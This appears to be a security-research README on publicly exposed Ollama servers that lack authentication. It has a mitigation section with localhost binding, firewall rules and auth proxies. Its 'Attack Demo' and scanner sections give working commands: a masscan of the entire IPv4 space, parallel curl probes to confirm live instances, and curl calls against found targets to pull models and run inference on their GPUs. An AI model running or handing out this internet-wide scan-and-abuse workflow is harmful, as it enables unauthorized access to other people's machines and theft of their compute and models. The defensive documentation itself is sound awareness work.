# fuckollama

**Ollama Security Research** - Documenting the risks of publicly exposed Ollama instances.

---

## The Problem

Ollama runs on port **11434** by default with **no authentication** enabled out of the box. This makes it trivially easy for anyone to scan the entire internet and discover exposed instances.

### Why This Matters

- **No authentication** by default - anyone can access your Ollama API
- **Easy discovery** - one command to find all public instances worldwide
- **Model theft** - attackers can download all your fine-tuned models
- **Prompt injection** - inject malicious prompts into your running instances
- **Compute abuse** - use your GPU resources for free
- **Data exfiltration** - potential access to sensitive data in prompts/models

---

## Attack Demo

### Step 1: Scan the Internet for Ollama Instances

```bash
sudo masscan -p11434 0.0.0.0/0 --exclude 255.255.255.255 --rate=1000 -oX scanout.xml
```

This scans the entire IPv4 address space for port 11434. The `--rate=1000` sets packets per second (adjust based on your connection).

### Step 2: Extract IPs from Masscan Output

```bash
grep -oP 'addr="[^"]+' scanout.xml | cut -d'"' -f2 > ips.txt
```

### Step 3: Parallel Check for Live Ollama Instances

```bash
parallel -j 20 'curl -s --max-time 3 http://{}:11434/api/tags | grep -q "\"models\"" && echo {}' :::: ips.txt > ollama_live.txt
```

This uses GNU Parallel to check 20 IPs simultaneously, filtering for instances that respond with a valid `/api/tags` endpoint (confirming Ollama is running).

### Result

You now have a list of publicly accessible Ollama instances. Anyone can:
- Run `curl http://<ip>:11434/api/tags` to list all models
- Run `curl http://<ip>:11434/api/pull -d '{"name": "llama2"}'` to download models
- Run `curl http://<ip>:11434/api/generate -d '{"model": "llama2", "prompt": "..."}'` to generate text

---

## Quick Scanner Tool

Use the included `scan.sh` script for easy scanning:

### Requirements

```bash
sudo apt install masscan parallel
```

### Usage

```bash
# Quick test (private IP ranges - no root needed)
./scan.sh --quick

# Full internet scan (requires root)
sudo ./scan.sh --full

# Full scan with custom timeout (300 seconds default)
sudo ./scan.sh --full --timeout 60

# Scan specific IP list
./scan.sh --ip-file ips.txt

# Custom range with custom rate
./scan.sh --range 1.0.0.0/8 --rate 500
```

### Options

| Option | Description | Default |
|--------|-------------|---------|
| `--quick` | Quick scan (private ranges) | - |
| `--full` | Full internet scan | - |
| `--rate NUM` | Scan rate (packets/sec) | 1000 |
| `--port NUM` | Port to scan | 11434 |
| `--timeout SEC` | Timeout in seconds | 300 |
| `--ip-file FILE` | Scan IPs from file | - |
| `--range RANGE` | Custom IP range (CIDR) | - |

### Output

- `scan_*.bin` - Raw masscan binary output
- `scan_*.xml` - Masscan XML output
- `scan_*.ips` - List of IPs with port open
- `ollama_live.txt` - Confirmed live Ollama instances

---

## Real-World Impact

### What Attackers Can Do

1. **Steal Models**
   ```bash
   curl http://<target>:11434/api/pull -d '{"name": "llama2:7b"}'
   ```
   Download any model hosted on the instance.

2. **Run Inference on Your GPU**
   ```bash
   curl http://<target>:11434/api/generate -d '{"model": "llama2", "prompt": "Write a blog post about..."}'
   ```
   Free compute for attackers.

3. **Access Sensitive Data**
   - Prompt history may contain sensitive business/personal information
   - Fine-tuned models may contain proprietary knowledge
   - Model weights could contain training data leaks

4. **Prompt Injection Attacks**
   - Manipulate ongoing conversations
   - Corrupt model outputs
   - Potential RCE if models execute system commands

---

## Mitigation

### 1. Bind to Localhost Only (Recommended)

Edit your Ollama service configuration:

```bash
# Linux (systemd)
sudo systemctl edit ollama
```

Add:
```
[Service]
Environment="OLLAMA_HOST=127.0.0.1:11434"
```

### 2. Firewall Rules

```bash
# iptables
sudo iptables -A INPUT -p tcp --dport 11434 -s 127.0.0.1 -j ACCEPT
sudo iptables -A INPUT -p tcp --dport 11434 -j DROP

# Or ufw
sudo ufw deny 11434
```

### 3. Network Isolation

- Run Ollama in a private network
- Use VPN or tunnel for remote access
- Consider container networking with restricted policies

### 4. Authentication Layer (Future)

Currently Ollama has no built-in auth. Options:
- Use reverse proxy with auth (nginx, caddy, cloudflare access)
- Implement API key at application level
- Monitor for unauthorized access

### 5. Monitor & Alert

- Set up alerts for unexpected outbound traffic
- Log API access patterns
- Use intrusion detection systems

---

## Disclosure Timeline

This research follows responsible disclosure practices:
1. Issue identified
2. Documented for awareness
3. Mitigation strategies provided

---

## References

- [Ollama Documentation](https://github.com/ollama/ollama)
- [Masscan](https://github.com/robertdavidgraham/masscan)
- [GNU Parallel](https://www.gnu.org/software/parallel/)

---

## License

MIT